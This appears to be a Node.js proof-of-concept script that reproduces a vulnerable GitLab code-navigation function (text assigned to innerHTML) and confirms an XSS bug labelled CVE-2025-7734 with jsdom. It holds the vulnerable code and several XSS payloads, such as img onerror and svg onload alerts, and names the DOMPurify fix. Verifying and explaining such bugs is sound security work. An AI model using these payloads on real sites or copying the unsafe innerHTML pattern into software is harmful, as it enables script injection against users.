const { JSDOM } = require('jsdom');

// Create a simulated browser environment
const dom = new JSDOM('<!DOCTYPE html><html><body></body></html>', {
  runScripts: "dangerously",
  pretendToBeVisual: true
});
const { document, window } = dom.window;

// â”€â”€â”€ EXACT CODE FROM GITLAB (pre-fix) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

function createSpan() {
  return document.createElement('span');
}

function wrapSpacesWithSpans(text) {
  return text
    .replace(/\t/g, '<span class="code-nav-tab">\t</span>')
    .replace(/ {2}/g, '<span class="code-nav-space">  </span>');
}

// VULNERABLE wrapNodes â€” assigns textContent to innerHTML
function wrapNodes(text, classList, dataset) {
  const wrapper = createSpan();
  wrapper.innerHTML = wrapSpacesWithSpans(text);  // â† THE BUG
  return wrapper;
}

// â”€â”€â”€ TEST CASES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const testCases = [
  {
    name: "XSS via <img> onerror",
    input: '<img/src/onerror=alert(document.domain)>',
    expectXSS: true
  },
  {
    name: "XSS via <svg> onload",
    input: '<svg/onload=alert(1)>',
    expectXSS: true
  },
  {
    name: "XSS via <script> tag",
    input: '<script>alert("XSS")</script>',
    expectXSS: true
  },
  {
    name: "Safe text (no HTML)",
    input: 'hello world',
    expectXSS: false
  },
  {
    name: "HTML entities (already escaped)",
    input: '&lt;img onerror=alert()&gt;',
    expectXSS: false
  }
];

console.log('â•â•â• CVE-2025-7734 Node.js Verification â•â•â•');
console.log('Testing wrapNodes() with various inputs:\n');

let xssCount = 0;

testCases.forEach((tc, i) => {
  console.log(`Test ${i + 1}: ${tc.name}`);
  console.log(`  Input text:  "${tc.input}"`);

  // Simulate what happens: textContent contains the decoded text
  const span = document.createElement('span');
  span.textContent = tc.input;  // Browser stores as text, not HTML
  const textContent = span.textContent;

  console.log(`  textContent: "${textContent}"`);

  // Now run the vulnerable function
  const result = wrapNodes(textContent);
  console.log(`  innerHTML:   "${result.innerHTML}"`);

  // Check for dangerous elements
  const dangerousEls = result.querySelectorAll('img, svg, script, iframe, object, embed');
  const hasEventHandlers = result.innerHTML.match(/on\w+\s*=/i);

  if (dangerousEls.length > 0) {
    xssCount++;
    const tags = Array.from(dangerousEls).map(e => e.tagName.toLowerCase());
    console.log(`  RESULT: ğŸš¨ XSS! Created ${dangerousEls.length} element(s): <${tags.join('>, <')}>`);
    if (hasEventHandlers) {
      console.log(`  EVENT HANDLERS: ${result.innerHTML.match(/on\w+\s*=/gi).join(', ')}`);
    }
  } else {
    console.log(`  RESULT: âœ… Safe (no dangerous elements created)`);
  }
  console.log('');
});

console.log('â•â•â• SUMMARY â•â•â•');
console.log(`XSS triggered: ${xssCount}/${testCases.length} test cases`);
console.log(`Vulnerability: ${xssCount > 0 ? 'CONFIRMED' : 'NOT CONFIRMED'}`);
console.log('');
console.log('Root cause: wrapNodes() assigns textContent to innerHTML');
console.log('textContent returns decoded text â†’ innerHTML parses it as HTML');
console.log('Fix: DOMPurify.sanitize() before innerHTML assignment (commit 8370acfa)');

process.exit(xssCount > 0 ? 0 : 1);